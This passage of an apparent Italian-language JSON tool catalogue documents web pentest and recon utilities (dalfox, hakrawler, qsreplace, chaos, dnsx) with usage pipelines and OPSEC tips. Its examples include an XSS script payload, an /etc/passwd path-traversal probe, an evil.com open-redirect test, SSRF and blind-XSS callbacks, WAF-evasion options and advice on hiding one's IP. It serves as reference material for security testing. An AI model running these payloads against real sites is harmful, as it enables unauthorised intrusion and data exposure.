      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "dalfox",
    "name": "dalfox",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/hahwul/dalfox",
    "desc": "Scanner XSS automatizzato con detection reflected, stored e DOM-based tramite analisi statica e headless browser.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DalFox (DAta Leak and Finding Open Redirect/XSS) è lo scanner XSS più avanzato disponibile, costruito in Go da hahwul per automatizzare la detection di vulnerabilità Cross-Site Scripting in applicazioni web moderne. A differenza di scanner generici, DalFox è specializzato esclusivamente su XSS, implementando tecniche sofisticate che combinano analisi statica del codice sorgente, dynamic analysis tramite parameter fuzzing, e verifica comportamentale con headless browser per confermare l'effettiva esecuzione JavaScript.</p><p>Il tool eccelle nel gestire scenari complessi: WAF bypass tramite encoding chain e payload mutation, context-aware injection che adatta i payload al contesto HTML/JavaScript/Attribute in cui vengono riflessi, e DOM-based XSS detection che altri tool spesso mancano. La modalità Blind XSS supporta callback a server esterni per catturare esecuzioni delayed. Con oltre 1500 payload built-in e supporto per custom payloads, DalFox rappresenta lo state-of-the-art nel XSS hunting automatizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Mode Architecture:</strong> URL mode per test singoli, File mode per batch scanning, Pipe mode per integrazione in pipeline Unix, SXSS mode per Stored XSS con form submission automatica, Server mode che espone REST API per integrazione con altri tool, Payload mode per generazione di payload contestuali.</p><p><strong>Intelligent Parameter Analysis:</strong> Mining automatico di parametri da HTML source, JavaScript files e form elements. Identifica reflection points prima del fuzzing, ottimizzando le richieste e riducendo il rumore.</p><p><strong>Context-Aware Fuzzing:</strong> Analizza dove il payload viene riflesso (tag HTML, attributo, JavaScript context, URL parameter) e seleziona automaticamente i payload più efficaci per quel contesto specifico. Supporta breaking out da attributi, tag, commenti HTML e stringhe JS.</p><p><strong>WAF Bypass Engine:</strong> Implementa encoding chain (HTML entities, URL encoding, Unicode normalization, case variation), payload mutation e tecniche di evasione per bypassare WAF comuni come Cloudflare, Akamai, ModSecurity.</p><p><strong>Verification System:</strong> Headless browser integration (Chrome/Chromium) per verificare che i payload trovati effettivamente triggherino l'esecuzione JavaScript, eliminando falsi positivi da reflection senza execution.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANNING BASE ===\n# Scan URL singolo con tutti i controlli\ndalfox url \"https://target.com/search?q=test\" -o results.txt\n\n# Scan con parametri multipli\ndalfox url \"https://target.com/page?id=1&amp;name=test&amp;action=view\"\n\n# === SCANSIONI MASSIVE ===\n# Pipeline da gau/waybackurls - workflow tipico bug bounty\ngau target.com | grep \"=\" | uro | dalfox pipe -o xss_findings.txt\n\n# Batch scan con concurrency e timeout configurati\ndalfox file urls_with_params.txt -w 50 --timeout 10 -o batch_results.txt\n\n# === MODALITA' AVANZATE ===\n# Stored XSS - testa form submission\ndalfox sxss \"https://target.com/comment\" -d \"comment=FUZZ\" \\\n  --trigger \"https://target.com/view-comments\"\n\n# Blind XSS con callback server\ndalfox url \"https://target.com/feedback?msg=test\" \\\n  --blind \"https://your-server.com/callback\"\n\n# === WAF BYPASS ===\n# Encoding chain per WAF evasion\ndalfox url \"https://target.com/search?q=test\" \\\n  --waf-evasion --encoder url,html,unicode\n\n# Custom payload con WAF bypass\ndalfox url \"https://target.com/\" --custom-payload waf_bypass.txt \\\n  --skip-bav  # skip basic attack vectors, usa solo custom\n\n# === CONFIGURAZIONI AVANZATE ===\n# Con headers custom (auth, cookie)\ndalfox url \"https://target.com/api?q=test\" \\\n  -H \"Cookie: session=abc123\" \\\n  -H \"Authorization: Bearer token\" \\\n  --proxy http://127.0.0.1:8080  # route attraverso Burp\n\n# Mining parametri da pagina e test automatico\ndalfox url \"https://target.com/page\" --mining-all --deep-domxss\n\n# === OUTPUT &amp; REPORTING ===\n# Output JSON per parsing programmatico\ndalfox file urls.txt --format json -o report.json\n\n# Solo URL vulnerabili (per pipeline)\ndalfox pipe &lt; urls.txt --silence --only-poc\n\n# === SERVER MODE ===\n# Avvia API server per integrazione\ndalfox server --host 0.0.0.0 --port 6664\n# Poi: curl -X POST http://localhost:6664/scan -d '{\"url\":\"...\"}'\n\n# === DOM XSS SPECIFICO ===\n# Deep DOM analysis con headless\ndalfox url \"https://spa-target.com/#/page?param=test\" \\\n  --deep-domxss --headless</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Bug Bounty hunting:</strong> XSS rimane una delle vulnerabilità più comuni e remunerative. DalFox permette di testare migliaia di URL in batch, trovando injection points che scanner generici mancano.</li><li><strong>Penetration Testing web:</strong> Verifica sistematica di tutti i parametri user-controllati per reflection XSS. Il report dettagliato include PoC copiabili per il deliverable.</li><li><strong>Stored XSS assessment:</strong> La modalità SXSS automatizza il test di form che persistono input e lo rendono visibile ad altri utenti (commenti, profili, messaggi).</li><li><strong>DOM XSS research:</strong> L'integrazione headless browser è essenziale per SPA moderne dove la reflection avviene client-side tramite JavaScript.</li><li><strong>CI/CD security gate:</strong> Integrato in pipeline per regression testing, assicura che fix XSS non vengano reintrodotti in release successive.</li><li><strong>WAF testing:</strong> Utile per security team che vogliono verificare l'efficacia delle regole WAF contro XSS payload evoluti.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento WAF:</strong> I payload XSS (tag script, event handlers, javascript: URI) sono pattern ben noti ai WAF. Aspettarsi blocchi frequenti senza evasion.</li><li><strong>Rate limiting:</strong> Molti parametri per pagina generano molte richieste. Configurare <code>-w</code> e <code>--delay</code> per evitare blocchi.</li><li><strong>Log analysis:</strong> Ogni payload testato è loggato server-side. Pattern come <code>&lt;script&gt;</code> nei log sono red flag evidenti.</li><li><strong>Headless detection:</strong> Siti con bot detection (Cloudflare, PerimeterX) possono identificare e bloccare il browser headless.</li><li><strong>Blind XSS exposure:</strong> Il callback server espone il tuo IP. Usare server terzi o VPN per anonimato.</li></ul><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "hakrawler",
    "name": "hakrawler",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/hakluke/hakrawler",
    "desc": "Web crawler veloce in Go per scoprire URL e file JavaScript durante la reconnaissance.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hakrawler è un web crawler minimalista ma potente, costruito in Go utilizzando la libreria Colly, ottimizzato per la fase di reconnaissance di security assessments. A differenza di crawler general-purpose come Burp Spider, Hakrawler è progettato specificamente per le esigenze dei penetration tester: estrae rapidamente tutti i link, form, endpoint e file JavaScript da un'applicazione web, producendo output pulito ready per pipeline con altri tool.</p><p>La sua forza sta nella semplicità e velocità: accetta URL da stdin, crawla con parallelismo configurabile, e produce output su stdout che può essere direttamente pipelined a tool di vulnerability scanning. Il supporto per scope control (subdomain, same-domain, all) e depth limiting permette di calibrare precisamente l'ampiezza della scansione in base al target e al tempo disponibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Concurrent Crawling:</strong> Parallelismo configurabile (default 8 thread) per bilanciare velocità e carico sul target. Ogni thread mantiene la propria sessione HTTP con connection pooling.</p><p><strong>Scope Control Granulare:</strong> <code>-subs</code> include subdomain nel crawl (es. da target.com crawla anche api.target.com), <code>-depth</code> limita la profondità di link follow, utile per site con strutture profonde o infinite loop detection.</p><p><strong>Output Customization:</strong> Output plain text (un URL per riga) per pipeline Unix, oppure JSON strutturato con metadata (source page, tag type, attribute). L'opzione <code>-u</code> deduplica l'output on-the-fly.</p><p><strong>JavaScript Discovery:</strong> Estrae tutti i riferimenti a file .js, fondamentale per successiva analisi con tool come LinkFinder o JSParser che cercano endpoint e secrets hardcoded nel codice.</p><p><strong>Form &amp; Endpoint Extraction:</strong> Identifica form HTML con relativi action URL e metodi, e parametri query string che possono essere target di injection testing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === CRAWLING BASE ===\n# Crawl singolo target - estrai tutti i link\necho \"https://target.com\" | hakrawler\n\n# Include subdomain nel scope (segue link a *.target.com)\necho \"https://target.com\" | hakrawler -subs\n\n# Limita profondità per siti enormi\necho \"https://target.com\" | hakrawler -depth 3\n\n# === PIPELINE RECON ===\n# Workflow completo: subdomain -&gt; probe -&gt; crawl -&gt; dedup\nsubfinder -d target.com -silent | httpx -silent | hakrawler -subs -u | tee all_urls.txt\n\n# Estrai solo file JavaScript per analisi secrets\necho \"https://target.com\" | hakrawler -subs | grep \"\\.js$\" | sort -u &gt; js_files.txt\ncat js_files.txt | xargs -I {} bash -c 'curl -s {} | grep -oE \"[a-zA-Z0-9_]+=[a-zA-Z0-9]+\"'\n\n# === SCANSIONE MASSIVA ===\n# Crawl lista di subdomain con output JSON\ncat live_hosts.txt | hakrawler -subs -depth 2 -json &gt; crawl_results.json\n\n# Pipeline verso nuclei per vulnerability scan\ncat live_hosts.txt | hakrawler -subs -u | nuclei -t exposures/ -t cves/ -o vulns.txt\n\n# === CONFIGURAZIONI AVANZATE ===\n# Con autenticazione via cookie\necho \"https://target.com\" | hakrawler -h \"Cookie: session=abc123; token=xyz\"\n\n# Attraverso proxy per logging in Burp\necho \"https://target.com\" | hakrawler -proxy http://127.0.0.1:8080\n\n# User-Agent custom per evitare blocchi\necho \"https://target.com\" | hakrawler -h \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n\n# === ESTRAZIONE PARAMETRI ===\n# Trova URL con parametri per injection testing\necho \"https://target.com\" | hakrawler -subs | grep \"?\" | grep \"=\" | sort -u &gt; urls_with_params.txt\n\n# Pipeline diretta a dalfox per XSS scan\necho \"https://target.com\" | hakrawler -subs | grep \"=\" | dalfox pipe -o xss_results.txt\n\n# === OUTPUT STRUTTURATO ===\n# JSON per parsing programmatico\necho \"https://target.com\" | hakrawler -json | jq '.url' -r | sort -u</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Attack Surface Mapping:</strong> Prima fase di ogni web pentest - mappa tutti gli endpoint raggiungibili dall'applicazione target prima di procedere con testing specifico.</li><li><strong>JavaScript Analysis Setup:</strong> Estrae tutti i file .js per successiva analisi con LinkFinder, JSParser o grep manuali alla ricerca di API keys, endpoint interni, secrets hardcoded.</li><li><strong>Bug Bounty recon:</strong> Parte essenziale della recon pipeline insieme a subfinder, httpx, gau. Trova pagine e parametri che non appaiono in archivi storici.</li><li><strong>Form Discovery:</strong> Identifica form di login, registrazione, contatto, upload che sono target primari per testing di autenticazione, CSRF, injection.</li><li><strong>Scope Verification:</strong> Per programmi bug bounty con scope definiti, verifica quali endpoint sono effettivamente raggiungibili e in-scope.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Traffic Volume:</strong> Il crawling genera molte richieste HTTP. Senza rate limiting, può apparire come DDoS o attivare protezioni automatiche.</li><li><strong>Log Footprint:</strong> Ogni URL visitata è loggata server-side. Il pattern di accesso sequenziale a tutti gli endpoint è riconoscibile.</li><li><strong>WAF Detection:</strong> User-Agent default e pattern di crawling possono triggerare blocchi WAF. Usare <code>-h</code> per header custom.</li><li><strong>Infinite Loops:</strong> Siti con URL dinamiche (session ID, timestamp) possono causare crawl infiniti. Usare <code>-depth</code> per limitare.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "qsreplace",
    "name": "qsreplace",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/tomnomnom/qsreplace",
    "desc": "Utility per sostituire i valori dei query string parameter negli URL con un valore custom.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Qsreplace è una utility Unix-style essenziale nel toolkit di ogni bug bounty hunter e penetration tester, creata da tomnomnom. La sua funzione è semplice ma fondamentale: prende URL da stdin e sostituisce tutti i valori dei query string parameter con un valore specificato, producendo output su stdout. Questa operazione apparentemente banale è il collante che permette di connettere tool di reconnaissance (gau, waybackurls, hakrawler) con tool di vulnerability testing (nuclei, dalfox, sqlmap).</p><p>Il tool implementa anche deduplicazione intelligente: URL con la stessa combinazione host+path+parametri vengono emesse una sola volta, anche se i valori originali erano diversi. Questo riduce drasticamente il numero di test necessari quando si lavora con archivi storici che contengono migliaia di varianti della stessa URL. La modalità append permette di aggiungere payload ai valori esistenti invece di sostituirli, utile per injection che richiedono un prefisso valido.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Value Replacement:</strong> Sostituisce il valore di ogni parametro query string con la stringa specificata. Input: <code>site.com/page?id=123&amp;name=test</code> → Output: <code>site.com/page?id=PAYLOAD&amp;name=PAYLOAD</code></p><p><strong>Append Mode:</strong> Con <code>-a</code>, appende il payload al valore esistente invece di sostituirlo. Utile per SQL injection dove il valore originale deve essere preservato: <code>id=123</code> → <code>id=123'</code></p><p><strong>Smart Deduplication:</strong> Elimina automaticamente URL duplicate basandosi su host+path+set di parametri, non sui valori. Evita di testare la stessa injection point migliaia di volte.</p><p><strong>Unix Philosophy:</strong> Fa una cosa sola e la fa bene. Stdin/stdout per composizione con altri tool tramite pipe.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === OPERAZIONI BASE ===\n# Sostituisci tutti i valori con marker FUZZ\ncat urls.txt | qsreplace 'FUZZ'\n# Input:  https://target.com/search?q=test&amp;page=1\n# Output: https://target.com/search?q=FUZZ&amp;page=FUZZ\n\n# Append invece di sostituire (per SQLi)\ncat urls.txt | qsreplace -a \"'\"\n# Input:  https://target.com/user?id=123\n# Output: https://target.com/user?id=123'\n\n# === PIPELINE VULNERABILITY TESTING ===\n# XSS testing: gau -&gt; dedup -&gt; replace -&gt; dalfox\ngau target.com | grep \"=\" | qsreplace '\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;' | \\\n  dalfox pipe --silence --only-poc -o xss_vulns.txt\n\n# SQLi testing: prepara URL per sqlmap batch\ncat urls.txt | qsreplace 'FUZZ' | sort -u &gt; sqlmap_targets.txt\nwhile read url; do\n  sqlmap -u \"$url\" --batch --dbs --random-agent\ndone &lt; sqlmap_targets.txt\n\n# SSRF testing con collaborator/webhook\ngau target.com | grep \"=\" | qsreplace 'https://webhook.site/YOUR-ID' | \\\n  xargs -P 20 -I {} curl -sk {} &amp;&gt;/dev/null\n\n# === WORKFLOW COMPLETI ===\n# Recon completa -&gt; parameter testing\nsubfinder -d target.com -silent | httpx -silent | \\\n  katana -silent | grep \"=\" | uro | qsreplace 'FUZZ' | \\\n  nuclei -t fuzzing/ -o fuzz_results.txt\n\n# LFI testing massivo\ncat urls.txt | qsreplace '../../../etc/passwd' | \\\n  xargs -P 10 -I {} sh -c 'curl -sk \"{}\" | grep -q \"root:\" &amp;&amp; echo \"[VULN] {}\"'\n\n# Open redirect testing\ngau target.com | grep -E \"(url|redirect|next|return|goto)=\" | \\\n  qsreplace 'https://evil.com' | xargs -P 10 -I {} curl -skIL {} | \\\n  grep -i \"location.*evil.com\"\n\n# === COMBINAZIONE CON ALTRI TOOL ===\n# Prepara URL per ffuf parameter fuzzing\ncat urls.txt | qsreplace 'FUZZ' | head -1 &gt; fuzz_template.txt\nffuf -w wordlist.txt -u \"$(cat fuzz_template.txt)\" -mc 200,302\n\n# Nuclei fuzzing templates\ncat urls.txt | qsreplace 'FUZZ' | nuclei -t fuzzing/ -fuzz -o results.txt\n\n# === DEDUPLICAZIONE ===\n# Mostra effetto deduplicazione\necho -e \"site.com/a?id=1\\nsite.com/a?id=2\\nsite.com/a?id=3\" | qsreplace 'X'\n# Output: site.com/a?id=X (solo una volta!)\n\n# Combina con uro per max deduplicazione\ngau target.com | uro | qsreplace 'FUZZ' | wc -l  # molto meno URL</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Injection Point Preparation:</strong> Trasforma URL storiche da gau/waybackurls in target pronti per injection testing. Il marker FUZZ indica dove inserire payload.</li><li><strong>Mass Vulnerability Testing:</strong> Permette di testare centinaia di endpoint rapidamente con payload statici (XSS probe, SQLi quote, path traversal).</li><li><strong>Fuzzing Setup:</strong> Prepara URL template per tool come ffuf o nuclei fuzzing mode che richiedono placeholder espliciti.</li><li><strong>SSRF/Open Redirect Discovery:</strong> Sostituisce parametri URL-like con callback server per identificare vulnerabilità di redirect e SSRF.</li><li><strong>Deduplication Layer:</strong> Riduce drammaticamente il numero di test eliminando URL che differiscono solo per valore dei parametri.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Tool Locale:</strong> Qsreplace stesso non genera traffico di rete - opera esclusivamente su stdin/stdout.</li><li><strong>Downstream Traffic:</strong> I payload inseriti causano traffico quando le URL generate vengono effettivamente testate. I payload malevoli nei log sono tracciabili.</li><li><strong>Encoding:</strong> Non esegue URL encoding automatico. Payload con caratteri speciali potrebbero richiedere encoding manuale prima dell'uso.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "Utilities"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-chaos",
    "name": "chaos",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/chaos-client",
    "desc": "Client CLI per Chaos Dataset API di ProjectDiscovery per subdomain enumeration passiva.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Chaos Client è il client CLI ufficiale per accedere al Chaos Dataset di ProjectDiscovery, uno dei più grandi database pubblici di subdomain al mondo. Il dataset viene popolato continuamente da scansioni automatizzate dell'infrastruttura ProjectDiscovery e contiene centinaia di milioni di subdomain raccolti passivamente da programmi bug bounty, Fortune 500 e domini popolari. A differenza di tool attivi come subfinder, Chaos non genera alcun traffico verso il target: le query vengono eseguite esclusivamente contro l'API ProjectDiscovery.</p><p>Questo approccio completamente passivo è invaluable in scenari dove la stealth è critica o come primo step di reconnaissance per avere immediatamente una baseline di subdomain noti prima di procedere con enumerazione attiva. Il dataset copre oltre 40 milioni di programmi bug bounty e viene aggiornato quotidianamente. L'accesso richiede una API key gratuita ottenibile registrandosi su cloud.projectdiscovery.io.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massive Dataset Access:</strong> Accesso a centinaia di milioni di subdomain pre-raccolti. Per domini popolari, il dataset può contenere migliaia di subdomain che richiederebbero giorni di brute-force per essere scoperti attivamente.</p><p><strong>Zero Target Interaction:</strong> Tutte le query sono verso l'API Chaos. Il target non riceve alcun traffico, rendendo l'operazione completamente invisibile.</p><p><strong>Statistics &amp; Analytics:</strong> Il comando <code>-stats</code> mostra metriche sul dataset: numero totale di domini tracciati, subdomain per dominio, data ultimo aggiornamento.</p><p><strong>Batch Processing:</strong> Elabora liste di domini in batch, ideale per valutare l'attack surface di organizzazioni con molti asset.</p><p><strong>Integration Ready:</strong> Output plain text o JSON per facile integrazione con altri tool dell'ecosistema ProjectDiscovery (httpx, nuclei, subfinder).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Configura API key (ottenere da cloud.projectdiscovery.io)\nexport PDCP_API_KEY=\"your-api-key-here\"\n# Oppure salva in ~/.config/pdcp/config.yaml\n\n# === QUERY BASE ===\n# Subdomain per singolo dominio\nchaos -d target.com\n\n# Con output su file\nchaos -d target.com -o target_subdomains.txt\n\n# Output JSON per parsing\nchaos -d target.com -json | jq '.subdomains[]' -r\n\n# === BATCH PROCESSING ===\n# Query multipli domini (bug bounty multi-scope)\ncat scope_domains.txt | chaos -o all_subdomains.txt\n\n# Con file input esplicito\nchaos -dL domains.txt -o batch_results.txt\n\n# === STATISTICHE ===\n# Visualizza statistiche dataset\nchaos -d target.com -count\n# Output: target.com has 1,234 subdomains\n\n# Lista programmi bug bounty indicizzati\nchaos -ls\n\n# === PIPELINE RECON ===\n# Workflow passivo completo: chaos -&gt; httpx -&gt; nuclei\nchaos -d target.com -silent | httpx -silent | \\\n  nuclei -t exposures/ -t cves/ -severity high,critical -o vulns.txt\n\n# Combina con subfinder per max coverage\n(chaos -d target.com -silent; subfinder -d target.com -silent) | \\\n  sort -u | httpx -silent &gt; live_hosts.txt\n\n# === CONFRONTO PRE/POST ===\n# Salva baseline iniziale\nchaos -d target.com -o baseline_$(date +%Y%m%d).txt\n\n# Dopo N giorni, confronta per nuovi subdomain\nchaos -d target.com -o current.txt\ncomm -23 &lt;(sort current.txt) &lt;(sort baseline_*.txt) &gt; new_subdomains.txt\n\n# === OUTPUT FORMATTATO ===\n# Solo hostname senza protocollo\nchaos -d target.com -silent | sed 's/^/https:\\/\\//' | httpx -silent\n\n# Filtra per pattern (es. staging, dev)\nchaos -d target.com -silent | grep -E \"(stag|dev|test|uat)\"\n\n# === VERIFICA COVERAGE ===\n# Controlla se un dominio è nel dataset\nchaos -d smallcompany.com -count\n# Se 0, il dominio non è tracciato - usa solo tool attivi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Stealth Reconnaissance:</strong> Prima fase di recon in engagement dove ogni pacchetto verso il target deve essere giustificato. Zero footprint sul target.</li><li><strong>Bug Bounty Quick Start:</strong> Prima di investire tempo in enumerazione attiva, controlla cosa è già noto. Spesso il dataset Chaos contiene già centinaia di subdomain per programmi popolari.</li><li><strong>Attack Surface Baseline:</strong> Stabilisce una baseline di asset noti per confronto futuro. Utile per monitorare l'espansione dell'infrastruttura di un target.</li><li><strong>Scope Validation:</strong> Verifica rapidamente quali asset di un'organizzazione sono pubblicamente noti e potrebbero essere in-scope per un engagement.</li><li><strong>Red Team Preparation:</strong> Raccoglie intelligence passiva prima di engagement attivi, riducendo il rumore iniziale.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Target Footprint:</strong> Completamente passivo verso il target. Nessun pacchetto, nessun log, nessun alert.</li><li><strong>API Provider Visibility:</strong> ProjectDiscovery vede le query. Per engagement sensibili, considerare che le query potrebbero essere loggate.</li><li><strong>Dataset Freshness:</strong> I dati potrebbero non essere aggiornati al minuto. Subdomain molto recenti potrebbero non essere ancora indicizzati.</li><li><strong>Coverage Variabile:</strong> Domini piccoli o nuovi potrebbero non essere nel dataset. Sempre combinare con enumerazione attiva per completezza.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-dnsx",
    "name": "dnsx",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/dnsx",
    "desc": "Toolkit DNS multi-purpose per risoluzione, brute-force e validazione con supporto wildcard detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>dnsx è il toolkit DNS definitivo di ProjectDiscovery, costruito sulla libreria retryabledns per massima affidabilità e performance. Progettato per operazioni di reconnaissance su larga scala, combina risoluzione DNS veloce con funzionalità avanzate come wildcard filtering, multi-query support per tutti i record type, e brute-force con wordlist. È il tool di riferimento per validare e arricchire liste di subdomain generate da altri tool.</p><p>La sua architettura supporta resolver multipli (UDP, TCP, DoH, DoT) con automatic retry e failover, garantendo risultati affidabili anche con liste di milioni di hostname. Il wildcard detection multi-livello elimina automaticamente i falsi positivi che affliggono altri resolver, mentre l'output strutturato permette estrazione di IP, CNAME, nameserver e altri record per analisi successive. È il ponte tra subdomain enumeration e port scanning.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Record Type Support:</strong> Query per A, AAAA, CNAME, NS, MX, TXT, SRV, SOA, PTR, CAA, AXFR, ANY e modalità recon che estrae tutti i tipi in una volta sola.</p><p><strong>Wildcard Detection Avanzato:</strong> Sistema multi-livello che identifica e filtra DNS wildcard (domini che rispondono a qualsiasi query) prevenendo migliaia di falsi positivi nelle enumerazioni.</p><p><strong>Brute-Force Integrato:</strong> Supporto nativo per subdomain brute-forcing con wordlist, incluso placeholder FUZZ per pattern matching dinamico come <code>FUZZ.target.com</code>.</p><p><strong>Resolver Flexibility:</strong> Usa resolver di sistema, lista custom, o specifici protocolli (DNS-over-HTTPS con Cloudflare/Google, DNS-over-TLS). Automatic retry con backoff e failover tra resolver.</p><p><strong>Rich Output:</strong> Oltre al semplice hostname, può emettere response code, TTL, IP address, CNAME target, e raw response per analisi dettagliata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === RISOLUZIONE BASE ===\n# Risolvi singolo hostname\necho \"api.target.com\" | dnsx\n\n# Risolvi lista di subdomain (output: hostname che risolvono)\ncat subdomains.txt | dnsx -silent -o resolved.txt\n\n# Con response IP incluso\ncat subdomains.txt | dnsx -a -resp\n# Output: api.target.com [1.2.3.4]\n\n# === RECORD TYPE SPECIFICI ===\n# Estrai CNAME per identificare CDN/terze parti\ncat subdomains.txt | dnsx -cname -resp\n# Output: cdn.target.com [d111111abcdef8.cloudfront.net]\n\n# Estrai MX per mail server\necho \"target.com\" | dnsx -mx -resp\n\n# Estrai TXT per SPF, DKIM, verifications\necho \"target.com\" | dnsx -txt -resp\n\n# Recon mode: tutti i record types\necho \"target.com\" | dnsx -recon -resp-only\n\n# === SUBDOMAIN BRUTE-FORCE ===\n# Brute-force con wordlist\ndnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# Con pattern FUZZ per nomenclature specifiche\ndnsx -d target.com -w words.txt -wp \"FUZZ-api.FUZZ\"\n# Testa: dev-api.dev, staging-api.staging, etc.\n\n# === WILDCARD HANDLING ===\n# Abilita wildcard filtering esplicito\ncat subdomains.txt | dnsx -wd target.com\n\n# Test se dominio ha wildcard\necho \"randomnonexistent12345.target.com\" | dnsx -a -resp\n# Se risolve, wildcard è attivo\n\n# === RESOLVER AVANZATI ===\n# Usa resolver custom (file con IP:porta)\ncat subdomains.txt | dnsx -r resolvers.txt -a -resp\n\n# DNS-over-HTTPS (Cloudflare)\ncat subdomains.txt | dnsx -doh-url https://cloudflare-dns.com/dns-query\n\n# Con retry e timeout custom\ncat subdomains.txt | dnsx -retry 3 -t 5 -a -resp\n\n# === PIPELINE RECON ===\n# Workflow completo: subfinder -&gt; dnsx validate -&gt; extract IPs -&gt; nmap\nsubfinder -d target.com -silent | dnsx -a -resp-only | \\\n  sort -u | tee ips.txt | nmap -iL - -sV -oN scan.txt\n\n# Validazione + probe HTTP\ncat all_subdomains.txt | dnsx -silent | httpx -silent | nuclei -t cves/\n\n# Estrai provider (CDN, Cloud) da CNAME\ncat subdomains.txt | dnsx -cname -resp | grep -E \"(cloudfront|akamai|fastly|azure|aws)\"\n\n# === REVERSE DNS ===\n# PTR lookup per range IP\necho \"1.2.3.4\" | dnsx -ptr -resp\n\n# Da CIDR a hostname\nprips 192.168.1.0/24 | dnsx -ptr -resp-only | grep target.com\n\n# === OUTPUT FORMATTATO ===\n# JSON per parsing programmatico\ncat subdomains.txt | dnsx -a -resp -json -o results.json\n\n# Solo IP (per nmap input)\ncat subdomains.txt | dnsx -a -resp-only -silent &gt; ips.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Subdomain Validation:</strong> Dopo enumeration con subfinder/amass, valida quali hostname risolvono effettivamente. Elimina subdomain morti prima di scanning HTTP.</li><li><strong>IP Extraction:</strong> Estrae gli indirizzi IP per costruire target list per port scanning con nmap/masscan. Identifica se più subdomain puntano allo stesso IP (virtual hosting).</li><li><strong>Infrastructure Mapping:</strong> CNAME resolution rivela dipendenze da CDN (CloudFront, Akamai), cloud provider (AWS, Azure, GCP), e servizi terzi potenzialmente vulnerabili a takeover.</li><li><strong>Brute-Force Enumeration:</strong> Alternativa a massdns/shuffledns quando serve integrazione stretta con workflow ProjectDiscovery.</li><li><strong>Reverse DNS Recon:</strong> Da IP noti (es. da certificate transparency) trova hostname associati che potrebbero essere fuori scope apparente ma collegati al target.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>DNS Query Logging:</strong> Le query DNS sono visibili ai resolver utilizzati. ISP e corporate DNS loggano le richieste.</li><li><strong>Resolver Choice:</strong> Per anonimato, usare resolver pubblici (8.8.8.8, 1.1.1.1) invece del DNS aziendale. Per stealth totale, usare DoH/DoT.</li><li><strong>Traffic Volume:</strong> Brute-force genera migliaia di query. Rate limiting e distribuzione tra resolver prevengono blocchi.</li><li><strong>Authoritative NS Detection:</strong> I nameserver autoritativi del target vedono tutte le query. Considerare se questo traffico è accettabile nell'engagement.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "puredns",
    "name": "puredns",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/d3mondev/puredns",
    "desc": "Tool per DNS resolution e subdomain brute-force veloce con filtering wildcard e validazione.",
